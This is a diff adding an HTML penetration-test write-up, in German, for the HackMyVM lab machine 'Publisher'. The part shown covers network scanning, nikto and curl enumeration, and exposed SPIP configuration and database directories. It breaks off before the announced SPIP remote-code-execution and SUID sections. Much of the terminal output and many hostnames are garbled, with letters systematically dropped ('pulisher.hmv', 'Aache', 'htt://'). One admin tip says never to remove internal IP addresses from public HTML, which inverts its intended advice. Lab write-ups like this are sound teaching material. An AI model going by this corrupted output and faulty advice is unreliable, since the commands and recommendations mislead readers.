@@ -1,1 +1,1241 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Publisher - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Publisher - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+  <div class="header-bg">
+        <h1>Publisher - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container level-easy">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">sqlite3</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">ll</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">man</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">openssl</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh2john</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#proof-of-concept-rce">Proof of Concept: SPIP RCE (CVE-2023-27372)</a></li>
+                <li><a href="#initial-access">Initial Access (Shell as www-data)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept-suid">Proof of Concept: SUID Binary Manipulation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Wie bei jedem Pentest beginne ich mit der Identifizierung des Zielsystems im lokalen Netzwerk. Der Befehl `arp-scan -l | grep "PCS" | awk '{print $1}'` sendet ARP-Anfragen, filtert die Antworten nach Systemen mit "PCS" im MAC-Adressen-Hersteller (oft VirtualBox VMs) und extrahiert dann die IP-Adresse. Diese Methode hilft mir, schnell die relevante Ziel-VM in meinem Testnetzwerk zu lokalisieren.
+                <br><strong>Bewertung:</strong> Dieser gezielte Scan ist effizient, um die IP-Adresse der Zielmaschine zu finden, insbesondere in Umgebungen mit mehreren virtuellen Maschinen. Die Ausgabe `192.168.2.38` identifiziert eindeutig das Zielsystem für diesen Pentest.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze ARP-Scans, um aktive Hosts im lokalen Segment zu identifizieren. Verfeinere die Ergebnisse mit `grep` und `awk` oder ähnlichen Tools, um die für dich relevanten Systeme schnell zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Segmentieren Sie Ihre Netzwerke, um den Umfang von ARP-basierten Scans zu begrenzen. Überwachen Sie Netzwerkverkehr auf ungewöhnliche ARP-Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre><span class="command">192.168.2.38</span></pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem die IP-Adresse (`192.168.2.38`) des Zielsystems feststeht, füge ich den zugehörigen Hostnamen (`publisher.hmv`) zur lokalen `/etc/hosts`-Datei auf meinem Angreifersystem hinzu. Ich zeige hier den relevanten Eintrag. Dies ist oft notwendig, da Webanwendungen oder andere Dienste auf virtuellen Hostnamen konfiguriert sein können, die nicht über die IP-Adresse allein korrekt erreicht werden. Das Hinzufügen des Hostnamens simuliert eine korrekte DNS-Auflösung und ermöglicht mir, das Zielsystem unter seinem vorgesehenen Namen anzusprechen.
+                <br><strong>Bewertung:</strong> Das manuelle Hinzufügen des Hostnamens zur `/etc/hosts` ist ein Standardvorgehen im Pentesting und entscheidend für die erfolgreiche Web-Enumeration, wenn Hostname-basierte virtuelle Hosts verwendet werden.
+                <br><strong>Empfehlung (Pentester):</strong> Prüfe bei VMs immer, ob ein Hostname existiert und füge ihn deiner `/etc/hosts` hinzu. Teste den Zugriff sowohl über IP als auch über Hostname.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne Hostnamen korrekt über interne DNS-Server aufgelöst werden. Erwägen Sie, Host-Header-Prüfungen auf Webservern zu erzwingen, um Anfragen, die nur die IP-Adresse verwenden, abzulehnen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hsts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.38    pulisher.hmv</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Mein nächster Schritt ist ein umfassender Nmap-Scan, um alle offenen Ports und die darauf laufenden Dienste zu identifizieren. Die Schalter `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (alle Ports von 1 bis 65535) und `-T5` (aggressives Timing) sorgen für eine gründliche Untersuchung. Die erste Ausgabe zeigt eine Zusammenfassung der gefundenen offenen Ports: Port 22 mit OpenSSH und Port 80 mit einem Apache HTTP-Server.
+                <br><strong>Bewertung:</strong> Offene Ports sind die direktesten Angriffsflächen. Port 22 (SSH) und Port 80 (HTTP) sind Standarddienste, die in den meisten Pentests eine Rolle spielen. Der Webserver auf Port 80 wird mein primäres Ziel für die weitere Enumeration sein.
+                <br><strong>Empfehlung (Pentester):</strong> Führe immer einen vollständigen Portscan durch. Die Zusammenfassung der offenen Ports gibt schnell einen Überblick über die potenziellen Angriffsvektoren.
+                <br><strong>Empfehlung (Admin):</strong> Schließen Sie alle nicht absolut notwendigen Ports auf öffentlich zugänglichen Systemen. Überwachen Sie ungewöhnliche Portaktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -A pulisher.hmv | grep pen</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp pen  ssh     penSSH 8.2p1 Untu 4utu0.10 (Untu Linx; prtcl 2.0)</span>
+<span class="command">80/tcp pen  htt    Aache httd 2.4.41 ((Untu))</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Dies ist die detaillierte Nmap-Ausgabe für den Scan auf `publisher.hmv`. Sie bestätigt die offenen Ports 22 (SSH) und 80 (HTTP). Für SSH wird die Version OpenSSH 8.2p1 unter Ubuntu identifiziert, zusammen mit den SSH-Hostkeys (RSA, ECDSA, ED25519). Für Port 80 wird der Server als Apache httpd 2.4.41 unter Ubuntu angegeben, der HTTP-Titel lautet "Publisher's Pulse: SPIP Insights & Tips". Die Nmap-Skripte liefern zusätzliche Informationen wie den HTTP-Server-Header und den Titel. Die OS-Erkennung schätzt ein Linux-System ein. Die detaillierte Ausgabe des HTTP-Dienstes auf Port 80 ist hier am interessantesten, da sie direkt auf "SPIP" hinweist, ein bekanntes Content-Management-System.
+                <br><strong>Bewertung:</strong> Die detaillierte Nmap-Ausgabe ist eine Goldgrube. Sie liefert nicht nur Versionsinformationen (OpenSSH 8.2p1, Apache 2.4.41), die auf bekannte Schwachstellen überprüft werden können, sondern identifiziert auch das spezifische CMS, SPIP. Das Wissen über das CMS ist entscheidend für die weitere Web-Enumeration und die Suche nach spezifischen Schwachstellen.
+                <br><strong>Empfehlung (Pentester):</strong> Analysiere die vollständige Nmap-Ausgabe sorgfältig. Suche nach Versionsnummern von Diensten und Anwendungen (wie CMS). Überprüfe bekannte Schwachstellen-Datenbanken (CVE, Exploit-DB) für die identifizierten Versionen. Konzentriere dich auf die Enumeration des gefundenen CMS (SPIP).
+                <br><strong>Empfehlung (Admin):</strong> Halten Sie alle Systemdienste und Anwendungen (wie Apache, OpenSSH und CMS) auf dem neuesten Stand. Überprüfen Sie regelmäßig auf bekannte Schwachstellen in den von Ihnen verwendeten Softwareversionen und patchen oder aktualisieren Sie entsprechend. Minimieren Sie Informationen über die verwendete Software und deren Version in öffentlichen Headern oder Titeln.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -A 192.168.2.38</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Starting Nma 7.95 ( https://nma.rg ) at 2025-06-11 23:12 CEST</span>
+<span class="command">Nma scan reort fr pulisher.hmv (192.168.2.38)</span>
+<span class="command">Hst is u (0.00038s latency).</span>
+<span class="command">Nt shwn: 65533 clsed tc prts (reset)</span>
+<span class="command">PRT   STATE SERVICE VERSIN</span>
+<span class="command">22/tc pen  ssh     penSSH 8.21 Untu 4utu0.10 (Untu Linx; rctl 2.0)</span>
+| <span class="command">ssh-hstkey:</span>
+|   <span class="command">3072 44:5f:26:67:4:4a:91:9:59:7a:95:59:c8:4c:2e:04 (RSA)</span>
+|   <span class="command">256 0a:4:9:1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECSA)</span>
+|_  <span class="command">256 d3:3:97:ea:54:c:41:4d:03:39:f6:8f:ad:6:a0:f (E25519)</span>
+<span class="command">80/tc pen  htt    Aache httd 2.4.41 ((Untu))</span>
+|_<span class="command">htt-server-header: Aache/2.4.41 (Untu)</span>
+|_<span class="command">htt-title: Pulisher's Pulse: SPIP Insights & Tis</span>
+<span class="command">MAC Address: 08:00:27:A3:BE (PCS Systemtechnik/racle Virtalx virtal NIC)</span>
+<span class="command">evice tye: general prse|rer</span>
+<span class="command">Rning: Linx 4.X|5.X, MikrTik RterS 7.X</span>
+<span class="command">S CPE: ce:/li:li_kerel:4 ce:/li:li_kerel:5 ce:/mikrtik:rters:7 ce:/li:li_kerel:5.6.3</span>
+<span class="command">S details: Linx 4.15 - 5.1, feWrt 21.02 (Linx 5.4), Mikrtik RterS 7.2 - 7.5 (Linx 5.6.3)</span>
+<span class="command">Netwrk Distance: 1 h</span>
+<span class="command">Service Inf: S: Linx; CPE: ce:/li:li_kerel</span>
+
+TRACERUTE
+H RTT     ADDRESS
+1   <span class="command">0.38 ms pulisher.hmv (192.168.2.38)</span>
+
+<span class="command">S and Service detectin erfrmed. lease rert any incrrect reslts at htts://nma.rg/sut/.</span>
+<span class="command">Nma dne: 1 I address (1 hst u) scaed in 12.53 secnds</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+              <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="comment">
+                <strong>Analyse:</strong> Nach dem Portscan konzentriere ich mich auf den Apache-Webserver auf Port 80. Ich verwende das Tool `nikto -h http://publisher.hmv`, um bekannte Webserver-Schwachstellen und Konfigurationsprobleme zu scannen. Der Schalter `-C all` wird hier zwar in der Ausgabe nicht gezeigt, wäre aber nützlich, um alle CGI-Verzeichnisse zu prüfen. Nikto findet mehrere interessante Punkte: Es fehlen wichtige Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`). Es gibt einen Hinweis auf `wp-config.php`, was auf eine WordPress-Installation hindeuten könnte, aber der Site-Titel aus Nmap sprach von SPIP. Die Angabe einer internen IP-Adresse (`172.17.0.2`) in einem `Location`-Header für `/images` ist ein Informationsleck (CVE-2000-0649). ETags könnten Inode-Nummern preisgeben (CVE-2003-1418). Der Apache-Server (2.4.41) ist veraltet. Die erlaubten HTTP-Methoden (`GET, POST, OPTIONS, HEAD`) sind Standard. Und kritisch: Es gibt eine Verzeichnisauflistung (`Directory indexing`) für `/images/`.
+                <br><strong>Bewertung:</strong> Nikto liefert wertvolle Hinweise, auch wenn einige (wie der wp-config.php-Hinweis oder die Apache-Version) nicht direkt zu einer unmittelbaren Schwachstelle führen. Das Fehlen von Sicherheits-Headern ist eine geringe bis mittlere Schwachstelle. Das Preisgeben interner IP-Adressen ist ein Informationsleck. Die Verzeichnisauflistung für `/images/` ist eine mittlere Schwachstelle, da sie die Dateistruktur preisgibt und potenziell sensible Dateien auflisten könnte. Der wichtigste Hinweis aus Nmap war jedoch das SPIP CMS, was Nikto hier nicht explizit nennt, aber die weiteren Schritte prägen wird.
+                <br><strong>Empfehlung (Pentester):</strong> Führe immer einen Nikto-Scan durch, um schnell offensichtliche Webserver-Schwachstellen zu finden. Kombiniere die Ergebnisse mit anderen Tools und manueller Analyse. Das Preisgeben interner IPs und die Verzeichnisauflistung sind immer untersuchungswürdig.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihren Webserver so, dass wichtige Sicherheits-Header wie `X-Frame-Options`, `X-Content-Type-Options` und `Strict-Transport-Security` gesetzt sind. Vermeiden Sie das Preisgeben interner IP-Adressen in Headern. Deaktivieren Sie Verzeichnisauflistungen auf Ihrem Webserver. Halten Sie den Webserver auf dem neuesten Stand und überprüfen Sie dessen Konfiguration regelmäßig.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikt -h htt://ulisher.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+- Nikt v2.5.0
+---------------------------------------------------------------------------
++ Target I:          <span class="command">192.168.2.38</span>
++ Target Hstname:    pulisher.hmv
++ Target Prt:        80
++ Start Time:         2025-06-11 23:12:42 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">Aache/2.4.41 (Untu)</span>
++ /: The anti-clickjacking X-Frame-tin header is nt resent. See: [Link: htts://develer.mzilla.rg/en-US/dcs/Web/HTTP/Headers/X-Frame-tin | Ziel: htts://develer.mzilla.rg/en-US/dcs/Web/HTTP/Headers/X-Frame-tin]
++ /: The X-Cntent-Type-tin header is nt set. This culd allw the user agent t render the cntent f the site in a different fashin t the MIME tye. See: [Link: htts://www.netsarker.cm/we-vulneraility-sca/vulnerailities/missing-cntent-tye-header/ | Ziel: htts://www.netsarker.cm/we-vulneraility-sca/vulnerailities/missing-cntent-tye-header/]
++ N CGI irectries fnd (use '-C all' t frce check all ssile dirs)
++ RFC-1918 /images: I address fnd in the 'lcatio' header. The I is "<span class="command">172.17.0.2</span>". See: [Link: htts://prtswigger.net/k/isses/00600300_rivate-i-addresses-disclsed | Ziel: htts://prtswigger.net/k/isses/00600300_rivate-i-addresses-disclsed]
++ /images: The we server may reveal its internal r real I in the Lcatin header via a reqest t with HTTP/1.0. The vale is "<span class="command">172.17.0.2</span>". See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2000-0649 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2000-0649]
++ /: Server may leak indes via ETags, header fnd with file /, inde: 21ee, size: 60cf5aa5ef7f4, mtime: gzi. See: [Link: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2003-1418 | Ziel: htt://cve.mitre.rg/cgi-in/cvename.cgi?name=CE-2003-1418]
++ Aache/2.4.41 aears t e tdated (crrent is at least Aache/2.4.54). Aache 2.2.34 is the EL fr the 2.x ranch.
++ PTINS: Allwed HTTP Methds: GET, PST, PTINS, HEAD .
++ <span class="command">/images/: irectry indexing fnd.</span>
++ 7962 reqests: 0 errr(s) and 8 item(s) rerted n remte hst
++ En Time:           2025-06-11 23:13:04 (GMT2) (22 secnds)
+---------------------------------------------------------------------------
++ 1 hst(s) tested
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich untersuche die HTTP-Header der Hauptseite (`/`) mit `curl -Iv http://publisher.hmv`. Der `-I` Schalter führt einen `HEAD`-Request aus (holt nur Header), `-v` zeigt sowohl Request- als auch Response-Header. Die Ausgabe bestätigt die von Nmap gefundene IP, den erfolgreichen Verbindungsaufbau und die `HTTP/1.1 200 OK` Antwort. Die Response-Header bestätigen erneut den `Server: Apache/2.4.41 (Ubuntu)` und den `Content-Type: text/html`. Die `Last-Modified` und `ETag` Header geben Zeitstempel und Identifikatoren der Datei an (was potenziell für ETag-Inode-Leaks relevant ist, wie Nikto feststellte).
+                <br><strong>Bewertung:</strong> Diese grundlegende Überprüfung der Header bestätigt die ersten Nmap-Ergebnisse und liefert keine neuen kritischen Informationen, bestärkt aber die Erkenntnisse über die eingesetzte Technologie und den Status der Webseite.
+                <br><strong>Empfehlung (Pentester):</strong> Überprüfe die HTTP-Header manuell oder mit Tools, um Informationen über Server, Technologien und Dateieigenschaften zu sammeln.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass unnötige Header oder detaillierte Informationen (wie genaue Versionen oder ETag-Details, die Indizien liefern könnten) nicht preisgegeben werden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">crl -Iv htt://ulisher.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+* Hst ulisher.hmv:80 was reslved.
+* Iv6: (nne)
+* Iv4: <span class="command">192.168.2.38</span>
+*   Trying <span class="command">192.168.2.38:80</span>...
+* Cnnected t ulisher.hmv (<span class="command">192.168.2.38</span>) prt 80
+* sing HTTP/1.x
+> HEA / HTTP/1.1
+> Hst: ulisher.hmv
+> User-Agent: crl/8.13.0
+> Acce: */*
+>
+* Reqest cmletely sent ff
+< <span class="command">HTTP/1.1 200 K</span>
+<span class="command">HTTP/1.1 200 K</span>
+< <span class="command">Date: Wed, 11 Jun 2025 21:13:24 GMT</span>
+<span class="command">Date: Wed, 11 Jun 2025 21:13:24 GMT</span>
+< <span class="command">Server: Aache/2.4.41 (Untu)</span>
+<span class="command">Server: Aache/2.4.41 (Untu)</span>
+< <span class="command">Last-Mdifie: Wed, 20 ec 2023 19:05:25 GMT</span>
+<span class="command">Last-Mdifie: Wed, 20 ec 2023 19:05:25 GMT</span>
+< <span class="command">ETag: "21ee-60cf5aa5ef7f4"</span>
+<span class="command">ETag: "21ee-60cf5aa5ef7f4"</span>
+< <span class="command">Acce-Ranges: ytes</span>
+<span class="command">Acce-Ranges: ytes</span>
+< <span class="command">Cntent-Length: 8686</span>
+<span class="command">Cntent-Length: 8686</span>
+< <span class="command">Vary: Acce-Encodig</span>
+<span class="command">Vary: Acce-Encodig</span>
+< <span class="command">Cntent-Type: text/html</span>
+<span class="command">Cntent-Type: text/html</span>
+* Cnnexion #0 t hst ulisher.hmv left intact
+</pre>
+                </div>
+            </p>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich betrachte den Quellcode der Seite `view-source:http://publisher.hmv/spip/index.php`. Das ist eine nützliche Funktion von Browsern, um den gerenderten HTML-Quellcode zu sehen. Hier finde ich zwei sehr interessante Stellen:
+                1.  Eine Formular (`form`) mit der Methode `post` und einer `action`, die auf eine **interne IP-Adresse** verweist: `http://192.168.152.130:8000`. Dies ist ein schwerwiegendes Informationsleck, das auf interne Netzwerkstrukturen hindeutet.
+                2.  HTML-Kommentare, die die Version des CMS preisgeben: `meta name="generator" content="SPIP 4.2.0"`. Diese Kommentare listen auch CSS- und JS-Dateien auf, was die Struktur des SPIP-Templates zeigt. Die SPIP-CRON-Skripte, die per `<script>` oder `<noscript>` eine URL (`http://publisher.hmv/spip/spip.php?action=cron`) aufrufen, sind ebenfalls im Quellcode sichtbar.
+                <br><strong>Bewertung:</strong> Die Entdeckung der SPIP-Version (4.2.0) ist entscheidend. SPIP ist ein spezifisches Ziel-CMS, für das es oft öffentlich bekannte Schwachstellen gibt. Die interne IP-Adresse ist ebenfalls ein kritisches Informationsleck; auch wenn sie nicht direkt ausgenutzt werden kann, gibt sie Hinweise auf die interne Netzwerkarchitektur.
+                <br><strong>Empfehlung (Pentester):</strong> Analysiere immer den Quellcode von Webseiten auf Kommentare, versteckte Formulare, interne IP-Adressen oder andere Hinweise. Identifiziere das verwendete CMS und seine Version.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie niemals interne IP-Adressen oder interne Netzwerkdetails aus öffentlich zugänglichem HTML-Quellcode. Verhindern Sie, dass CMS-Software ihre genaue Version in Meta-Tags oder Kommentaren preisgibt. Deaktivieren Sie HTML-Kommentare in Produktionsumgebungen, wenn diese potenziell sensible Informationen enthalten könnten.
+            </p>
+             <div class="code-block">
+                 <!-- Beachte: <a> Tags und <form>, <button>, <script>, </script>, <?php, ?> etc. werden entfernt, andere HTML-Zeichen maskiert. -->
+                <div class="terminal">
+                     <pre>
+class='utin_actin_st ' methd='st' actin='http://<span class="command">192.168.152.130:8000</span>'> </div> submit >Startseite<
+
+<!-- cmact [
+	sqelettes-ist/css/reset.css?1703099120
+	sqelettes-ist/css/clear.css?1703099120
+	sqelettes-ist/css/fnt.css?1703099120
+	sqelettes-ist/css/links.css?1703099120
+	sqelettes-ist/css/ty.css?1703099120
+	sqelettes-ist/css/meia.css?1703099120
+	sqelettes-ist/css/frm.css?1703099120
+	sqelettes-ist/css/layt.css?1703099120
+	sqelettes-ist/css/si.css?1703099120
+	lugins-ist/meiax/li/lity/lity.css?1703099117
+	lugins-ist/meiax/lity/css/lity.meiax.css?1703099117
+	lugins-ist/meiax/lity/skins/_sile-dark/lity.css?1703099117
+	lugins-ist/rte_lme/css/arre_tils.css?1703099118
+	lcal/cache-css/cssn-css_arre_tils_icnes_css-e3746948.css?1749676351
+	sqelettes-ist/css/theme.css?1703099120
+<!-- cmact [
+	rive/javascrit/jery.js?1703099120
+	rive/javascrit/jery.frm.js?1703099120
+	rive/javascrit/jery.atsave.js?1703099120
+	rive/javascrit/jery.lacehlder-lael.js?1703099120
+	rive/javascrit/ajaxCallack.js?1703099120
+	rive/javascrit/js.ckie.js?1703099120
+	lugins-ist/meiax/li/lity/lity.js?1703099117
+	lugins-ist/meiax/lity/js/lity.meiax.js?1703099117
+	lugins-ist/meiax/javascrit/si.meiax.js?1703099117
+	lugins-ist/rte_lme/javascrit/jery.markitu_r_si.js?1703099118
+	lugins-ist/rte_lme/javascrit/jery.revisu_si.js?1703099118
+	lcal/cache-js/jsn-javascrit_rte_lme_start_js-5c9033.js?1749676351
+] 55.1% -->
+!--.age-->
+<!-- SI-CRN -->< scrpt >setTimeut(fnctin(){var x = new XMLHttReest();x.en('GET', 'htt://ulisher.hmv/si/si.h?actin=crn', tre);x.sen('');},100);< /scrpt ><nsit><div style="ackgrn-image: rl('htt://ulisher.hmv/si/si.h?actin=crn');"></iv></nsit></y>
+<
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Während der manuellen Erkundung stoße ich auf die Datei `/spip/config/remove.txt`. Der Inhalt dieser Datei ist in mehreren Sprachen gehalten ("Sie können diese Datei ohne Beschädigung löschen.", "You can safely remove this file.") und deutet darauf hin, dass diese Datei möglicherweise von früheren SPIP-Installationen übrig geblieben ist und keine Funktion mehr hat.
+                <br><strong>Bewertung:</strong> Das Auffinden von Restdateien aus früheren Installationen oder Updates ist an sich keine direkte Schwachstelle, kann aber auf eine nachlässige Systempflege hindeuten. Die Datei selbst enthält keine kritischen Informationen.
+                <br><strong>Empfehlung (Pentester):</strong> Achte auf veraltete oder überflüssige Dateien auf dem Webserver, die möglicherweise von früheren Installationen stammen. Diese könnten Hinweise auf frühere Versionen mit bekannten Schwachstellen geben oder vergessene Konfigurationen enthalten.
+                <br><strong>Empfehlung (Admin):</strong> Entfernen Sie nach Updates oder Deinstallationen sorgfältig alle nicht mehr benötigten Dateien aus dem Web-Root-Verzeichnis.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">http://pulisher.hmv/si/cnfig/reme.txt</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Sie knnen diese Datei hne Eschäigung lschen.
+
+Sie knnen diese Datei sicher entfernen.
+
+
+
+Vs zez effacer ce fichier sans amages.
+
+Yu can safely remve this file.
+
+Sie knnen diese Datei hne Eschäigung lschen.
+
+Sie knnen diese Datei sicher entfernen.
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich prüfe, ob Verzeichnisauflistungen (Directory Indexing) auf dem SPIP-Installationspfad und Unterverzeichnissen aktiviert sind. Der Zugriff auf `http://publisher.hmv/spip/config/` zeigt tatsächlich eine Verzeichnisauflistung des `config`-Ordners. Ich sehe hier kritische Dateien wie `chmod.php`, `cles.php`, `connect.php` (potenziell mit Datenbankzugangsdaten), `ecran_securite.php` und `remove.txt`. Innerhalb von `/spip/config/bases` ist ebenfalls Directory Indexing aktiviert, was die SQLite-Datenbankdateien `_sqlite3_install.sqlite` und `spip.sqlite` auflistet. Auch der Ordner `/spip/ecrire/auth` listet Dateien auf, darunter `ldap.php`, `sha256.inc.php` und `spip.php`.
+                <br><strong>Bewertung:</strong> Das aktivierte Directory Indexing auf diesen Verzeichnissen ist eine kritische Schwachstelle! Es gibt Angreifern einen vollständigen Überblick über die Dateistruktur des SPIP-Systems und legt potenziell sensible Konfigurations- oder Datenbankdateien offen. Das Auffinden der `spip.sqlite`-Datei und der `connect.php` in öffentlich zugänglichen Verzeichnissen ist ein schwerwiegendes Problem, das direkten Zugriff auf die Datenbank ermöglichen könnte.
+                <br><strong>Empfehlung (Pentester):</strong> Überprüfe immer auf Directory Indexing auf Webservern. Wenn aktiviert, durchsuche die Verzeichnisse nach Konfigurationsdateien, Datenbanken, Backup-Dateien, Quellcode oder anderen sensiblen Informationen. Lade kritische Dateien wie Datenbanken herunter.
+                <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Verzeichnisauflistungen auf Ihrem Webserver global oder zumindest für alle Verzeichnisse, die keine explizit öffentlichen Dateien enthalten. Stellen Sie sicher, dass sensible Dateien wie Datenbanken, Konfigurationsdateien oder Backup-Dateien niemals im Web-Root-Verzeichnis gespeichert sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">http://pulisher.hmv/si/cnfig/</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Inex f /si/cnfig
+[IC]	Name	Last mifie	Size	escritin
+[ARENTIR]	arent irectry	 	-
+[IR]	ases/	2025-06-11 21:14 	-
+[ ]	chmd.h	2023-12-20 19:05 	109
+[ ]	cles.h	2023-12-20 19:05 	163
+[ ]	cnnect.h	2023-12-20 19:05 	161
+[ ]	ecran_secrete.h	2023-12-20 19:05 	17K
+[TXT]	reme.txt	2023-12-20 19:05 	83
+Aache/2.4.41 (Untu) Server at pulisher.hmv Prt 80
+
+
+Inex f /si/cnfig/ases
+[IC]	Name	Last mifie	Size	escritin
+[ARENTIR]	arent irectry	 	-
+[ ]	_sqlite3_install.sqlite	2023-12-20 19:05 	0
+[ ]	<span class="command">si.sqlite</span>	2025-06-11 21:14 	<span class="command">512K</span>
+Aache/2.4.41 (Untu) Server at pulisher.hmv Prt 80
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">Inex f /si/ecrire/ath</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Inex f /si/ecrire/ath
+[IC]	Name	Last mifie	Size	escritin
+[ARENTIR]	arent irectry	 	-
+[ ]	lda.h	2023-12-20 19:05 	9.9K
+[ ]	sha256.inc.h	2023-12-20 19:05 	582
+[ ]	si.h	2023-12-20 19:05 	17K
+Aache/2.4.41 (Untu) Server at pulisher.hmv Prt 80
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Ich navigiere zur Anmeldeseite des SPIP-CMS, die unter `/spip/spip.php?page=login` erreichbar ist. Die URL `http://publisher.hmv/spip/spip.php?page=login&url=/spip/ecrire/index.php&lang=de` zeigt die Login-Formularfelder "Login-ID oder E-Mail" und "Passwort". Der Zusatz `&url=/spip/ecrire/index.php&lang=de` deutet auf Parameter für die Weiterleitung nach dem Login und die Sprache hin. Ein Blick in den Quellcode dieser Login-Seite (nicht im Output gezeigt, aber erwähnt) bestätigt erneut die SPIP-Version (`SPIP 4.2.0`) und zeigt Cookie-Namen (`spip_lang`, `spip_lang_ecrire`).
+                <br><strong>Bewertung:</strong> Das Auffinden der Login-Seite ist wichtig, da sie eine direkte Angriffsfläche für Credential Stuffing oder Brute-Force-Angriffe darstellt, falls gültige Anmeldedaten gefunden werden können. Die bestätigte SPIP-Version ist hier jedoch die kritischere Information, da sie eine gezielte Suche nach Exploits ermöglicht.
